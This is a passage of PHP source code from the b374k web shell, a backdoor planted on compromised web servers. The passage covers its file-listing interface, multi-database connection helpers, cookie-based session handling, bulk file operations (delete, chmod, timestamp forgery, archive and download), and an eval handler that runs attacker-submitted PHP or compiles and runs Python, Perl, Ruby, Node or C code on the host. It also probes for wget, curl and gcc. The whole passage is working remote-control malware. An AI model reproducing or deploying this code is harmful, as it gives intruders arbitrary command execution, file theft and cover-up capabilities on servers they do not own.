	<tr><th style='width:24px;min-width:24px;' class='sorttable_nosort'></th><th style='min-width:150px;'>name</th><th style='width:74px;min-width:74px;'>size</th>".$s_owner_html."<th style='width:80px;min-width:80px;'>perms</th><th style='width:150px;min-width:150px;'>modified</th><th style='width:200px;min-width:200px;' class='sorttable_nosort'>action</th></tr></thead><tbody>";

	$s_arc = get_archiver_available();
	foreach($s_list as $s_l){
		if(!$s_win && $s_posix){
			$s_name = posix_getpwuid(fileowner($s_l));
			$s_group = posix_getgrgid(filegroup($s_l));
			$s_owner = $s_name['name']."<span class='gaya'>:</span>".$s_group['name'];
			$s_owner_html = "<td style='text-align:center;'>".$s_owner."</td>";
		}

		$s_lhref = $s_lname = $s_laction = "";
		if(@is_dir($s_l)){
			if($s_l=="."){
				$s_lhref = $s_self."cd=".$s_cwd;
				$s_lsize = "LINK";
				$s_laction = "
				<span id='titik1'>
					<a href='".$s_self."cd=".$s_cwd."&find=".$s_cwd."'>find</a> | <a href='".$s_self."cd=".$s_cwd."&x=upload'>upl</a> | <a href='".$s_self."cd=".$s_cwd."&edit=".$s_cwd."newfile_1&new=yes'>+file</a> | <a href=\"javascript:tukar('titik1','', 'mkdir','newfolder_1');\">+dir</a>
				</span>
				<div id='titik1_form'></div>";
			}
			elseif($s_l==".."){
				$s_lhref = $s_self."cd=".$s_parent;
				$s_lsize = "LINK";
				$s_laction = "
				<span id='titik2'>
					<a href='".$s_self."cd=".$s_parent."&find=".$s_parent."'>find</a> | <a href='".$s_self."cd=".$s_parent."&x=upload'>upl</a> | <a href='".$s_self."cd=".$s_parent."&edit=".$s_parent."newfile_1&new=yes'>+file</a> | <a href=\"javascript:tukar('titik2','".adds($s_parent)."', 'mkdir','newfolder_1');\">+dir</a>
				</span>
				<div id='titik2_form'></div>";
			}
			else{
				$s_lhref = $s_self."cd=".$s_cwd.$s_l.DS;
				$s_lsize = "DIR";
				$s_laction = "
				<span id='".cs($s_l)."_'>
					<a href='".$s_self."cd=".$s_cwd.$s_l.DS."&find=".$s_cwd.$s_l.DS."'>find</a> | <a href='".$s_self."cd=".$s_cwd.$s_l.DS."&x=upload'>upl</a> | <a href=\"javascript:tukar('".cs($s_l)."_','','rename','".$s_l."','".$s_l."');\">ren</a> | <a href='".$s_self."cd=".$s_cwd."&del=".$s_l."'>del</a>
				</span>
				<div id='".cs($s_l)."__form'></div>";
				$s_total_dir++;
			}
			$s_lname = "[ ".$s_l." ]";
			$s_lsizetit = "0";
			$s_lnametit = "dir : ".$s_l;
		}
		else{
			$s_lhref = $s_self."view=".$s_cwd.$s_l;
			$s_lname = $s_l;
			$s_lsize = gs($s_l);
			$s_lsizetit = @filesize($s_l);
			$s_lnametit = "file : ".$s_l;
			$s_laction = "
			<span id='".cs($s_l)."_'>
				<a href='".$s_self."edit=".$s_cwd.$s_l."'>edit</a> | <a href='".$s_self."hexedit=".$s_cwd.$s_l."'>hex</a> | <a href=\"javascript:tukar('".cs($s_l)."_','','rename','".$s_l."','".$s_l."');\">ren</a> | <a href='".$s_self."del=".$s_cwd.$s_l."'>del</a> | <a href='".$s_self."dl=".$s_cwd.$s_l."'>dl</a>
			</span>
			<div id='".cs($s_l)."__form'></div>";
			$s_total_file++;
		}

		$s_cboxval = $s_cwd.$s_l;
		if($s_l=='.') $s_cboxval = $s_cwd;
		if($s_l=='..') $s_cboxval = $s_parent;

		$s_cboxes_id = substr(md5($s_lhref),0,8);
		$s_cboxes = "<input id='".$s_cboxes_id."' name='cbox' value='".$s_cboxval."' type='checkbox' class='css-checkbox' onchange='hilite(this);' />
					<label for='".$s_cboxes_id."' class='css-label'></label>";

		$s_ldl = str_replace("__dlpath__",$s_l,$s_arc);
		$s_ltime = filemtime($s_l);
		$s_buff .= "
		<tr>
		<td style='text-align:center;text-indent:4px;'>".$s_cboxes."</td>
		<td class='explorelist' title='".$s_lnametit."' ondblclick=\"return go('".adds($s_lhref)."',event);\">
			<a href='".$s_lhref."'>".$s_lname."</a>
		</td>
		<td title='".$s_lsizetit."'>".$s_lsize."</td>
		".$s_owner_html."
		<td style='text-align:center;'>".gp($s_l)."</td>
		<td style='text-align:center;' title='".$s_ltime."'>".@date("d-M-Y H:i:s",$s_ltime)."</td>
		<td>".$s_laction."</td>
		</tr>";
	}
	$s_buff .= "</tbody>";

	$s_extract = ""; $s_compress = "";
	if(class_exists("ZipArchive")){
		$s_extract .= "<option value='extractzip'>extract (zip)</option>";
		$s_compress .= "<option value='compresszip'>compress (zip)</option>";
	}
	if($s_tar){
		$s_extract .= "<option value='extracttar'>extract (tar)</option><option value='extracttargz'>extract (tar.gz)</option>";
		$s_compress .="<option value='compresstar'>compress (tar)</option><option value='compresstargz'>compress (tar.gz)</option>";
	}

	$s_extcom = ($s_extract!="" && $s_compress!="")? $s_extract."<option value='' disabled>-</option>".$s_compress:$s_extract.$s_compress;

	$s_buff .= "<tfoot><tr class='cbox_selected'>
			<td class='cbox_all'><input id='checkalll' type='checkbox' name='abox' class='css-checkbox' onclick='checkall();' /> <label for='checkalll' class='css-label'></label></td>
			<td>
			<form action='".$s_self."' method='post'>
			<select id='massact' class='inputzbut' onchange='massactgo();' style='width:100%;height:20px;margin:0;'>
				<option value='' disabled selected>Action</option>
				<option value='cut'>cut</option>
				<option value='copy'>copy</option>
				<option value='paste'>paste</option>
				<option value='delete'>delete</option>
				<option value='' disabled>-</option>
				<option value='chmod'>chmod</option>
				<option value='touch'>touch</option>
				<option value='' disabled>-</option>
				".$s_extcom."
			</select>
			<noscript><input type='button' value='Go !' class='inputzbut' onclick='massactgo();' /></noscript></form>
			</td><td colspan='".$s_colspan."' style='text-align:left;'>Total : ".$s_total_file." files, ".$s_total_dir." Directories<span id='total_selected'></span></td>
			</tr></tfoot>
			</table>";

	return $s_buff;
}
//database related functions
function sql_connect($s_sqltype, $s_sqlhost, $s_sqluser, $s_sqlpass){
	if($s_sqltype == 'mysql'){ if(function_exists('mysql_connect')) return @mysql_connect($s_sqlhost, $s_sqluser, $s_sqlpass); }
	elseif($s_sqltype == 'mssql'){
		if(function_exists('mssql_connect')) return @mssql_connect($s_sqlhost, $s_sqluser, $s_sqlpass);
		elseif(function_exists('sqlsrv_connect')){
			$s_coninfo = array("UID"=>$s_sqluser, "PWD"=>$s_sqlpass);
			return @sqlsrv_connect($s_sqlhost,$s_coninfo);
		}
	}
	elseif($s_sqltype == 'pgsql'){
		$s_hosts = explode(":", $s_sqlhost);
		if(count($s_hosts)==2){
			$s_host_str = "host=".$s_hosts[0]." port=".$s_hosts[1];
		}
		else $s_host_str = "host=".$s_sqlhost;
		if(function_exists('pg_connect')) return @pg_connect("$s_host_str user=$s_sqluser password=$s_sqlpass");
	}
	elseif($s_sqltype == 'oracle'){ if(function_exists('oci_connect')) return @oci_connect($s_sqluser, $s_sqlpass, $s_sqlhost); }
	elseif($s_sqltype == 'sqlite3'){
		if(class_exists('SQLite3')) if(!empty($s_sqlhost)) return new SQLite3($s_sqlhost);
		else return false;
	}
	elseif($s_sqltype == 'sqlite'){ if(function_exists('sqlite_open')) return @sqlite_open($s_sqlhost); }
	elseif($s_sqltype == 'odbc'){ if(function_exists('odbc_connect')) return @odbc_connect($s_sqlhost, $s_sqluser, $s_sqlpass); }
	elseif($s_sqltype == 'pdo'){
		if(class_exists('PDO')) if(!empty($s_sqlhost)) return new PDO($s_sqlhost, $s_sqluser, $s_sqlpass);
		else return false;
	}
	return false;
}
function sql_query($s_sqltype, $s_query, $s_con){
	if($s_sqltype == 'mysql') return mysql_query($s_query);
	elseif($s_sqltype == 'mssql'){
		if(function_exists('mssql_query')) return mssql_query($s_query);
		elseif(function_exists('sqlsrv_query')) return sqlsrv_query($s_con,$s_query);
	}
	elseif($s_sqltype == 'pgsql') return pg_query($s_query);
	elseif($s_sqltype == 'oracle') return oci_execute(oci_parse($s_con, $s_query));
	elseif($s_sqltype == 'sqlite3') return $s_con->query($s_query);
	elseif($s_sqltype == 'sqlite') return sqlite_query($s_con, $s_query);
	elseif($s_sqltype == 'odbc') return odbc_exec($s_con, $s_query);
	elseif($s_sqltype == 'pdo') return $s_con->query($s_query);
}
function sql_num_fields($s_sqltype, $s_hasil){
	if($s_sqltype == 'mysql') return mysql_num_fields($s_hasil);
	elseif($s_sqltype == 'mssql'){
		if(function_exists('mssql_num_fields')) return mssql_num_fields($s_hasil);
		elseif(function_exists('sqlsrv_num_fields')) return sqlsrv_num_fields($s_hasil);
	}
	elseif($s_sqltype == 'pgsql') return pg_num_fields($s_hasil);
	elseif($s_sqltype == 'oracle') return oci_num_fields($s_hasil);
	elseif($s_sqltype == 'sqlite3') return $s_hasil->numColumns();
	elseif($s_sqltype == 'sqlite') return sqlite_num_fields($s_hasil);
	elseif($s_sqltype == 'odbc') return odbc_num_fields($s_hasil);
	elseif($s_sqltype == 'pdo') return $s_hasil->columnCount();
}
function sql_field_name($s_sqltype,$s_hasil,$s_i){
	if($s_sqltype == 'mysql') return mysql_field_name($s_hasil,$s_i);
	elseif($s_sqltype == 'mssql'){
		if(function_exists('mssql_field_name')) return mssql_field_name($s_hasil,$s_i);
		elseif(function_exists('sqlsrv_field_metadata')){
			$s_metadata = sqlsrv_field_metadata($s_hasil);
			if(is_array($s_metadata)){
				$s_metadata=$s_metadata[$s_i];
			}
			if(is_array($s_metadata)) return $s_metadata['Name'];
		}
	}
	elseif($s_sqltype == 'pgsql') return pg_field_name($s_hasil,$s_i);
	elseif($s_sqltype == 'oracle') return oci_field_name($s_hasil,$s_i+1);
	elseif($s_sqltype == 'sqlite3') return $s_hasil->columnName($s_i);
	elseif($s_sqltype == 'sqlite') return sqlite_field_name($s_hasil,$s_i);
	elseif($s_sqltype == 'odbc') return odbc_field_name($s_hasil,$s_i+1);
	elseif($s_sqltype == 'pdo'){
		$s_res = $s_hasil->getColumnMeta($s_i);
		return $s_res['name'];
	}
}
function sql_fetch_data($s_sqltype,$s_hasil){
	if($s_sqltype == 'mysql') return mysql_fetch_row($s_hasil);
	elseif($s_sqltype == 'mssql'){
		if(function_exists('mssql_fetch_row')) return mssql_fetch_row($s_hasil);
		elseif(function_exists('sqlsrv_fetch_array')) return sqlsrv_fetch_array($s_hasil,1);
	}
	elseif($s_sqltype == 'pgsql') return pg_fetch_row($s_hasil);
	elseif($s_sqltype == 'oracle') return oci_fetch_row($s_hasil);
	elseif($s_sqltype == 'sqlite3') return $s_hasil->fetchArray(1);
	elseif($s_sqltype == 'sqlite') return sqlite_fetch_array($s_hasil,1);
	elseif($s_sqltype == 'odbc') return odbc_fetch_array($s_hasil);
	elseif($s_sqltype == 'pdo') return $s_hasil->fetch(2);
}
function sql_num_rows($s_sqltype,$s_hasil){
	if($s_sqltype == 'mysql') return mysql_num_rows($s_hasil);
	elseif($s_sqltype == 'mssql'){
		if(function_exists('mssql_num_rows')) return mssql_num_rows($s_hasil);
		elseif(function_exists('sqlsrv_num_rows')) return sqlsrv_num_rows($s_hasil);
	}
	elseif($s_sqltype == 'pgsql') return pg_num_rows($s_hasil);
	elseif($s_sqltype == 'oracle') return oci_num_rows($s_hasil);
	elseif($s_sqltype == 'sqlite3'){
		$s_metadata = $s_hasil->fetchArray();
		if(is_array($s_metadata)) return $s_metadata['count'];
	}
	elseif($s_sqltype == 'sqlite') return sqlite_num_rows($s_hasil);
	elseif($s_sqltype == 'odbc') return odbc_num_rows($s_hasil);
	elseif($s_sqltype == 'pdo') return $s_hasil->rowCount();
}
function sql_close($s_sqltype,$s_con){
	if($s_sqltype == 'mysql') return mysql_close($s_con);
	elseif($s_sqltype == 'mssql'){
		if(function_exists('mssql_close')) return mssql_close($s_con);
		elseif(function_exists('sqlsrv_close')) return sqlsrv_close($s_con);
	}
	elseif($s_sqltype == 'pgsql') return pg_close($s_con);
	elseif($s_sqltype == 'oracle') return oci_close($s_con);
	elseif($s_sqltype == 'sqlite3') return $s_con->close();
	elseif($s_sqltype == 'sqlite') return sqlite_close($s_con);
	elseif($s_sqltype == 'odbc') return odbc_close($s_con);
	elseif($s_sqltype == 'pdo') return $s_con = null;
}
if(!function_exists('str_split')){
	function str_split($s_t,$s_s=1){
		$s_a = array();
		for($s_i = 0; $s_i<strlen($s_t);){
			$s_a[] = substr($s_t,$s_i,$s_s);
			$s_i += $s_s;
		}
		return $s_a;
	}
}

// appearance
$s_theme = "dark"; // default is dark
if(isset($_COOKIE['theme'])) $s_theme = $_COOKIE['theme'];
if(isset($_GP['x']) && ($_GP['x']=='switch')){
	if(isset($_COOKIE['theme'])) $s_theme = $_COOKIE['theme'];
	if($s_theme=="bright") $s_theme = "dark";
	else $s_theme = "bright";
	setcookie("theme", $s_theme ,time() + $s_login_time);
}

$s_dark = array("#000000", "#FFFFFF", "#222222", "#4C9CAF", "#111111", "#AAAAAA", "#292929", "#363636", "#191919", "#444444", "#CCCCCC", "#999999", "#202020");
$s_bright = array("#FFFFFF", "#000000", "#DDDDDD", "#B36350", "#EEEEEE", "#555555", "#D6D6D6", "#C9C9C9", "#E6E6E6", "#BBBBBB", "#333333", "#666666", "#DFDFDF");
$s_highlight_dark = array("4C9CAF", "888888", "87DF45", "EEEEEE" , "FF8000");
$s_highlight_bright = array("B36350", "777777", "7820BA", "111111" , "007FFF");
$s_color = ($s_theme=="bright")? $s_bright:$s_dark;
$s_checkbox = ($s_theme=="bright")? $s_bright_cb:$s_dark_cb;

global $s_self, $s_win, $s_posix;

$s_self = "?";
$s_cek1 = basename($_SERVER['SCRIPT_FILENAME']);
$s_cek2 = substr(basename(__FILE__),0,strlen($s_cek1));

if(isset($_COOKIE['b374k_included'])){
	if(strcmp($s_cek1,$s_cek2)!=0) $s_self = $_COOKIE['s_self'];
	else{
		$s_self = "?";
		setcookie("b374k_included", "0" ,time() - $s_login_time);
		setcookie("s_self", $s_self ,time() + $s_login_time);
	}
}
else{
	if(strcmp($s_cek1,$s_cek2)!=0){
		if(!isset($_COOKIE['s_home'])){
			$s_home = "?".$_SERVER["QUERY_STRING"]."&";
			setcookie("s_home", $s_home ,time() + $s_login_time);
		}
		if(isset($s_home)) $s_self = $s_home;
		elseif(isset($_COOKIE['s_home'])) $s_self = $_COOKIE['s_home'];
		setcookie("b374k_included", "1" ,time() + $s_login_time);
		setcookie("s_self", $s_self ,time() + $s_login_time);
	}
	else{
		$s_self = "?";
		setcookie("b374k_included", "0" ,time() - $s_login_time);
		setcookie("s_self", $s_self ,time() + $s_login_time);
	}
}

if($s_auth){
	// server software
	$s_software = getenv("SERVER_SOFTWARE");
	// uname -a
	$s_system = php_uname();
	// check os
	$s_win = (strtolower(substr($s_system,0,3)) == "win")? true : false;
	// check for posix
	$s_posix = (function_exists("posix_getpwuid"))? true : false;
	// change working directory
	if(isset($_GP['cd'])){
		$s_dd = $_GP['cd'];
		if(@is_dir($s_dd)){
			$s_cwd = cp($s_dd);
			chdir($s_cwd);
			setcookie("cwd", $s_cwd ,time() + $s_login_time);
		}
	}
	else{
		if(isset($_COOKIE['cwd'])){
			$s_dd = ss($_COOKIE['cwd']);
			if(@is_dir($s_dd)){
				$s_cwd = cp($s_dd);
				chdir($s_cwd);
			}
		}
		else $s_cwd = cp(getcwd());
	}

	if(!$s_win && $s_posix){
		$s_userarr = posix_getpwuid(posix_geteuid());
		if(isset($s_userarr['name'])) $s_user = $s_userarr['name'];
		else $s_user = "$";
	}
	else {
		$s_user = get_current_user();
	}

	// prompt style
	$s_prompt = $s_user." &gt;";
	// server ip
	$s_server_ip = gethostbyname($_SERVER["HTTP_HOST"]);
	// your ip ;-)
	$s_my_ip = $_SERVER['REMOTE_ADDR'];
	$s_result = "";

	global $s_python, $s_perl, $s_ruby, $s_node, $s_gcc, $s_java, $s_tar, $s_wget, $s_lwpdownload, $s_lynx, $s_curl;

	$s_access = array("s_python", "s_perl", "s_ruby", "s_node", "s_gcc", "s_java", "s_tar", "s_wget", "s_lwpdownload", "s_lynx", "s_curl");
	foreach($s_access as $s){
		if(isset($_COOKIE[$s])){ $$s = $_COOKIE[$s]; }
		else{
			if(!isset($_COOKIE['b374k'])){
				$t = explode("_", $s);
				$t = check_access($t[1]);
				if($t!==false){
					$$s = $t;
					setcookie($s, $$s ,time() + $s_login_time);
				}
			}
		}
	}

	if(!empty($_GP['dltype']) && !empty($_GP['dlpath'])){
		ob_end_clean();
		$s_dltype = $_GP['dltype'];
		$s_dlpath = $_GP['dlpath'];

		$s_dlname = basename($s_dlpath);
		if($s_dlpath==".") $s_dlname = basename($s_cwd);
		elseif($s_dlpath==".."){
			chdir("..");
			$s_dlname=basename(getcwd());
			chdir($s_cwd);
		}
		$s_tmpdir = get_writabledir();
		$s_dlarchive = $s_tmpdir.$s_dlname;
		$s_dlthis = "";
		if($s_dltype=="ziparchive"){
			$s_dlarchive .= ".zip";
			if(zip($s_dlpath,$s_dlarchive)) $s_dlthis = $s_dlarchive;
		}
		elseif($s_dltype=="tar"){
			$s_dlarchive .= ".tar";
			$s_dlarchive = str_replace('\\', '/', $s_dlarchive);
			exe("tar cf ".$s_dlarchive." ".$s_dlpath);
			$s_dlthis = $s_dlarchive;
		}
		elseif($s_dltype=="targz"){
			$s_dlarchive .= ".tar.gz";
			$s_dlarchive = str_replace('\\', '/', $s_dlarchive);
			exe("tar czf ".$s_dlarchive." ".$s_dlpath);
			$s_dlthis = $s_dlarchive;
		}
		elseif($s_dltype=="raw"){
			if(@is_file($s_dlpath)) $s_dlthis = $s_dlpath;
		}

		if(@is_file($s_dlthis)){
			header("Content-Type: application/octet-stream");
			header('Content-Transfer-Encoding: binary');
			header("Content-length: ".@filesize($s_dlthis));
			header("Content-disposition: attachment; filename=\"".basename($s_dlthis)."\";");
			$s_file = @fopen($s_dlthis,"rb");
			while(!feof($s_file)){
				print(@fread($s_file, 1024*8));
				ob_flush();
				flush();
			}
			fclose($s_file);

			if($s_dltype!="raw"){
				rename($s_dlthis,$s_dlthis."del");
				unlink($s_dlthis."del");
			}
			die();
		}
	}
	// download file specified by ?dl=<file>
	if(isset($_GP['dl']) && ($_GP['dl'] != "")){
		ob_end_clean();
		$f = $_GP['dl'];
		$fc = file_get_contents($f);
		header("Content-type: application/octet-stream");
		header("Content-length: ".strlen($fc));
		header("Content-disposition: attachment; filename=\"".basename($f)."\";");
		echo $fc;
		die();
	}
	// massact
	if(isset($_GP['z'])){
		$s_massact = isset($_COOKIE['massact'])? $_COOKIE['massact']:"";
		$s_buffer = isset($_COOKIE['buffer'])? rtrim(ss($_COOKIE['buffer']),"|"):"";
		$s_lists = explode("|", $s_buffer);

		$s_counter = 0;
		if(!empty($s_buffer)){
			if($_GP['z']=='moveok'){
				foreach($s_lists as $s_l) if(rename($s_l,$s_cwd.basename($s_l))) $s_counter++;
				if($s_counter>0) $s_result .= notif($s_counter." items moved");
				else $s_result .= notif("No items moved");
			}
			elseif($_GP['z']=='copyok'){
				foreach($s_lists as $s_l){
					if(@is_dir($s_l)){
						copys($s_l,$s_cwd.basename($s_l));
						if(file_exists($s_cwd.basename($s_l))) $s_counter++;
					}
					elseif(@is_file($s_l)){
						copy($s_l,$s_cwd.basename($s_l));
						if(file_exists($s_cwd.basename($s_l))) $s_counter++;
					}
				}
				if($s_counter>0) $s_result .= notif($s_counter." items copied");
				else $s_result .= notif("No items copied");
			}
			elseif($_GP['z']=='delok'){
				foreach($s_lists as $s_l){
					if(@is_file($s_l)){
						if(unlink($s_l)) $s_counter++;
					}
					elseif(@is_dir($s_l)){
						rmdirs($s_l);
						if(!file_exists($s_l)) $s_counter++;
					}
				}
				if($s_counter>0) $s_result .= notif($s_counter." items deleted");
				else $s_result .= notif("No items deleted");
			}
			elseif(isset($_GP['chmodok'])){
				$s_mod = octdec($_GP['chmodok']);
				foreach($s_lists as $s_l) if(chmod($s_l,$s_mod)) $s_counter++;
				if($s_counter>0) $s_result .= notif($s_counter." items changed mode to ".decoct($s_mod));
				else $s_result .= notif("No items modified");
			}
			elseif(isset($_GP['touchok'])){
				$s_datenew = strtotime($_GP['touchok']);
				foreach($s_lists as $s_l) if(touch($s_l,$s_datenew)) $s_counter++;
				if($s_counter>0) $s_result .= notif($s_counter." items changed access and modification time to ".@date("d-M-Y H:i:s",$s_datenew));
				else $s_result .= notif("No items modified");
			}
			elseif(isset($_GP['compresszipok'])){
				$s_file = $_GP['compresszipok'];
				if(zip($s_lists, $s_file)) $s_result .= notif("Archive created : ".$s_file);
				else $s_result .= notif("Error creating archive file");
			}
			elseif(isset($_GP['compresstarok'])){
				$s_lists_ = array();
				$s_file = $_GP['compresstarok'];
				$s_file = basename($s_file);

				$s_lists__ = array_map("basename", $s_lists);
				$s_lists_ = array_map("pf", $s_lists__);
				exe("tar cf \"".$s_file."\" ".implode(" ", $s_lists_));

				if(@is_file($s_file)) $s_result .= notif("Archive created : ".$s_file);
				else $s_result .= notif("Error creating archive file");
			}
			elseif(isset($_GP['compresstargzok'])){
				$s_lists_ = array();
				$s_file = $_GP['compresstargzok'];
				$s_file = basename($s_file);

				$s_lists__ = array_map("basename", $s_lists);
				$s_lists_ = array_map("pf", $s_lists__);
				exe("tar czf \"".$s_file."\" ".implode(" ", $s_lists_));

				if(@is_file($s_file)) $s_result .= notif("Archive created : ".$s_file);
				else $s_result .= notif("Error creating archive file");
			}
			elseif(isset($_GP['extractzipok'])){
				$s_file = $_GP['extractzipok'];
				$zip = new ZipArchive();
				foreach($s_lists as $f){
					$s_target = $s_file.basename($f,".zip");
					if($zip->open($f)){
						if(!@is_dir($s_target)) @mkdir($s_target);
						if($zip->extractTo($s_target)) $s_result .= notif("Files extracted to ".$s_target);
						else $s_result .= notif("Error extrating archive file");
						$zip->close();
					}
					else $s_result .= notif("Error opening archive file");
				}
			}
			elseif(isset($_GP['extracttarok'])){
				$s_file = $_GP['extracttarok'];
				foreach($s_lists as $f){
					$s_target = "";
					$s_target = basename($f,".tar");
					if(!@is_dir($s_target)) @mkdir($s_target);
					exe("tar xf \"".basename($f)."\" -C \"".$s_target."\"");
				}
			}
			elseif(isset($_GP['extracttargzok'])){
				$s_file = $_GP['extracttargzok'];
				foreach($s_lists as $f){
					$s_target = "";
					if(strpos(strtolower($f), ".tar.gz")!==false) $s_target = basename($f,".tar.gz");
					elseif(strpos(strtolower($f), ".tgz")!==false) $s_target = basename($f,".tgz");
					if(!@is_dir($s_target)) @mkdir($s_target);
					exe("tar xzf \"".basename($f)."\" -C \"".$s_target."\"");
				}
			}
		}
		setcookie("buffer", "" ,time() - $s_login_time);
		setcookie("massact", "" ,time() - $s_login_time);
	}
	if(isset($_GP['y'])){
		$s_massact = isset($_COOKIE['massact'])? $_COOKIE['massact']:"";
		$s_buffer = isset($_COOKIE['buffer'])? rtrim(ss($_COOKIE['buffer']),"|"):"";
		$s_lists = explode("|", $s_buffer);

		if(!empty($s_buffer)){
			if($_GP['y']=='delete'){
				$s_result .= notif("Delete ? <a href='".$s_self."z=delok'>Yes</a> | <a href='".$s_self."'>No</a>");
				foreach($s_lists as $s_l) $s_result .= notif($s_l);
			}
			elseif($_GP['y']=='paste' && $s_massact=='cut'){
				$s_result .= notif("Move here ? <a href='".$s_self."z=moveok'>Yes</a> | <a href='".$s_self."'>No</a>");
				foreach($s_lists as $s_l) $s_result .= notif($s_l);
			}
			elseif($_GP['y']=='paste' && $s_massact=='copy'){
				$s_result .= notif("Copy here ? <a href='".$s_self."z=copyok'>Yes</a> | <a href='".$s_self."'>No</a>");
				foreach($s_lists as $s_l) $s_result .= notif($s_l);
			}
			elseif($_GP['y']=='chmod'){
				$s_result .= notif("Permissions ? <form action='".$s_self."' method='post'><input class='inputz' type='text' value='0755' name='chmodok' style='width:30px;text-align:center;' maxlength='4' /><input class='inputzbut' name='z' type='submit' value='Go !' /></form>");
				foreach($s_lists as $s_l) $s_result .= notif($s_l);
			}
			elseif($_GP['y']=='touch'){
				$s_result .= notif("Touch ? <form action='".$s_self."' method='post'><input class='inputz' type='text' value='".@date("d-M-Y H:i:s",time())."' name='touchok' style='width:130px;text-align:center;' /><input class='inputzbut' name='z' type='submit' value='Go !' /></form>");
				foreach($s_lists as $s_l) $s_result .= notif($s_l);
			}
			elseif($_GP['y']=='extractzip'){
				$s_result .= notif("Extract to ? <form action='".$s_self."' method='post'><input class='inputz' type='text' value='".$s_cwd."' name='extractzipok' style='width:50%;' /><input class='inputzbut' name='z' type='submit' value='Go !' /></form>");
				foreach($s_lists as $s_l) $s_result .= notif($s_l);
			}
			elseif($_GP['y']=='extracttar'){
				$s_result .= notif("Extract to ? <form action='".$s_self."' method='post'><input class='inputz' type='text' value='".$s_cwd."' name='extracttarok' style='width:50%;' /><input class='inputzbut' name='z' type='submit' value='Go !' /></form>");
				foreach($s_lists as $s_l) $s_result .= notif($s_l);
			}
			elseif($_GP['y']=='extracttargz'){
				$s_result .= notif("Extract to ? <form action='".$s_self."' method='post'><input class='inputz' type='text' value='".$s_cwd."' name='extracttargzok' style='width:50%;' /><input class='inputzbut' name='z' type='submit' value='Go !' /></form>");
				foreach($s_lists as $s_l) $s_result .= notif($s_l);
			}
			elseif($_GP['y']=='compresszip'){
				$s_result .= notif("Compress to ? <form action='".$s_self."' method='post'><input class='inputz' type='text' value='".$s_cwd.substr(md5(time()),0,8).".zip' name='compresszipok' style='width:50%;' /><input class='inputzbut' name='z' type='submit' value='Go !' /></form>");
				foreach($s_lists as $s_l) $s_result .= notif($s_l);
			}
			elseif($_GP['y']=='compresstar'){
				$s_result .= notif("Compress to ? <form action='".$s_self."' method='post'><input class='inputz' type='text' value='".$s_cwd.substr(md5(time()),0,8).".tar' name='compresstarok' style='width:50%;' /><input class='inputzbut' name='z' type='submit' value='Go !' /></form>");
				foreach($s_lists as $s_l) $s_result .= notif($s_l);
			}
			elseif($_GP['y']=='compresstargz'){
				$s_result .= notif("Compress to ? <form action='".$s_self."' method='post'><input class='inputz' type='text' value='".$s_cwd.substr(md5(time()),0,8).".tar.gz' name='compresstargzok' style='width:50%;' /><input class='inputzbut' name='z' type='submit' value='Go !' /></form>");
				foreach($s_lists as $s_l) $s_result .= notif($s_l);
			}
		}
	}

	// view image specified by ?img=<file>
	if(isset($_GP['img'])){
		ob_end_clean();
		$s_d = isset($_GP['d'])? $_GP['d']:"";
		$s_f = $_GP['img'];
		$s_inf = @getimagesize($s_d.$s_f);
		$s_ext = explode($s_f, ".");
		$s_ext = $s_ext[count($s_ext)-1];
	 	header("Content-type: ".$s_inf["mime"]);
	 	header("Cache-control: public");
		header("Expires: ".@date("r", @mktime(0,0,0,1,1,2030)));
		header("Cache-control: max-age=".(60*60*24*7));#
	 	readfile($s_d.$s_f);
	 	die();
	} // rename file or folder
	elseif(isset($_GP['oldname']) && isset($_GP['rename'])){
		$s_old = $_GP['oldname'];
		$s_new = $_GP['rename'];

		$s_renmsg = "";
		if(@is_dir($s_old)) $s_renmsg = (@rename($s_old, $s_new))? "Directory ".$s_old." renamed to ".$s_new : "Unable to rename directory ".$s_old." to ".$s_new;
		elseif(@is_file($s_old)) $s_renmsg = (@rename($s_old, $s_new))? "File ".$s_old." renamed to ".$s_new : "Unable to rename file ".$s_old." to ".$s_new;
		else $s_renmsg = "Cannot find the path specified ".$s_old;

		$s_result .= notif($s_renmsg);
		$s_fnew = $s_new;
	} // confirm delete
	elseif(!empty($_GP['del'])){
		$s_del = trim($_GP['del']);
		$s_result .= notif("Delete ".basename($s_del)." ? <a href='".$s_self."delete=".$s_del."'>Yes</a> | <a href='".$s_self."'>No</a>");
	} // delete file
	elseif(!empty($_GP['delete'])){
		$s_f = $_GP['delete'];
		$s_delmsg = "";

		if(@is_file($s_f)) $s_delmsg = (unlink($s_f))? "File removed : ".$s_f : "Unable to remove file ".$s_f;
		elseif(@is_dir($s_f)){
			rmdirs($s_f);
			$s_delmsg = (@is_dir($s_f))? "Unable to remove directory ".$s_f : "Directory removed : ".$s_f;
		}
		else $s_delmsg = "Cannot find the path specified ".$s_f;
		$s_result .= notif($s_delmsg);
	} // create dir
	elseif(!empty($_GP['mkdir'])){
		$s_f = $s_cwd.$_GP['mkdir'];
		$s_dirmsg = "";

		$s_num = 1;
		if(@is_dir($s_f)){
			$s_pos = strrpos($s_f,"_");
			if($s_pos!==false) $s_num = (int) substr($s_f, $s_pos+1);
			while(@is_dir(substr($s_f, 0, $s_pos)."_".$s_num)){
				$s_num++;
			}
			$s_f = substr($s_f, 0, $s_pos)."_".$s_num;
		}
		if(mkdir($s_f)) $s_dirmsg = "Directory created ".$s_f;
		else $s_dirmsg = "Unable to create directory ".$s_f;

		$s_result .= notif($s_dirmsg);
	} // php eval() function
	if(isset($_GP['x']) && ($_GP['x']=='eval')){
		$s_code = "";
		$s_res = "";
		$s_evaloption = "";
		$s_lang = "php";

		if(isset($_GP['evalcode'])){
			$s_code = $_GP['evalcode'];
			$s_evaloption = (isset($_GP['evaloption']))? $_GP['evaloption']:"";
			$s_tmpdir = get_writabledir();

			if(isset($_GP['lang'])){$s_lang = $_GP['lang'];}

			if(strtolower($s_lang)=='php'){
				ob_start();
				eval($s_code);
				$s_res = ob_get_contents();
				ob_end_clean();
			}
			elseif(strtolower($s_lang)=='python'||strtolower($s_lang)=='perl'||strtolower($s_lang)=='ruby'||strtolower($s_lang)=='node'){
				$s_rand = md5(time().rand(0,100));
				$s_script = $s_tmpdir.$s_rand;
				if(file_put_contents($s_script, $s_code)!==false){
					$s_res = exe($s_lang." ".$s_evaloption." ".$s_script);
					unlink($s_script);
				}
			}
			elseif(strtolower($s_lang)=='gcc'){
				$s_script = md5(time().rand(0,100));
				chdir($s_tmpdir);
				if(file_put_contents($s_script.".c", $s_code)!==false){
					$s_scriptout = $s_win ? $s_script.".exe" : $s_script;
					$s_res = exe("gcc ".$s_script.".c -o ".$s_scriptout.$s_evaloption);
					if(@is_file($s_scriptout)){
